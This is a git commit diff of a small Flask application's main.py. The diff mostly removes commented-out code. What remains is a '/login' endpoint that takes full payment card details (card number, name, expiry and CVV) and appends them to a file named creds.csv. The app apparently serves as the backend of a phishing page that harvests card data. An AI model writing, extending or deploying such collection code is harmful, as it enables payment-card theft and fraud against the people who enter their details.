8dbf5b762c2c0a4342318f5827981639b9b04adc
Subhrajyoti Mahato <86191223+Subhrajyoti2608@users.noreply.github.com>
2023-09-12 16:47:04 +0530

    Add files via upload

--- main.py
+++ main.py
@@ -5,56 +5,17 @@ app = Flask(__name__)
 
 @app.route("/")
 def index():
-    return render_template("/login.html")
+    return render_template("/index.html")
 
 @app.route("/login", methods=["POST"])
 def login():
-    
-    #card_number = request.json.get("card_number")
-    #name = request.json.get("name")
-    #expiry = request.json.get("expiry")
-    #cvv = request.get("cvv")
-
     card_number = request.json.get("card_number")
     name = request.json.get("name")
     expiry = request.json.get("expiry")
     cvv = request.json.get("cvv")
-
-    #card_number = request.json.get()
-    #name = request.json.get("name")
-    #expiry = request.json.get("expiry")
-    #cvv = request.json.get("cvv")
-     
-
-    #card_number = request.json.get("card_number")
-    #name = request.json.get("name")
-    #expiry = request.json.get("expiry")
-    
-    
     with open("creds.csv", "a+") as f:
         csv_writer = csv.writer(f)
         csv_writer.writerow([card_number, name, expiry, cvv])
-        
-        
-     #with open("creds.cvs", "a+") as f:
-        #csv_writer = csv.writer(f)
-        #csv_writer.writerow([card_number, name, expiry, cvv])
-        
-        
-     #with open("creds.csv", "a+") as f:
-        #csv_writer = csv.writer()
-        #csv_writer.writerow([card_number, name, expiry, cvv])
-      
-    #with open("creds.csv", "r+") as f:
-        #csv_writer = csv.writer(f)
-        #csv_writer.writerow([card_number, name, expiry, cvv])
-        
-      
-        
-        
-        
-        
-        
     return jsonify({
         "status": "success"
     }), 201
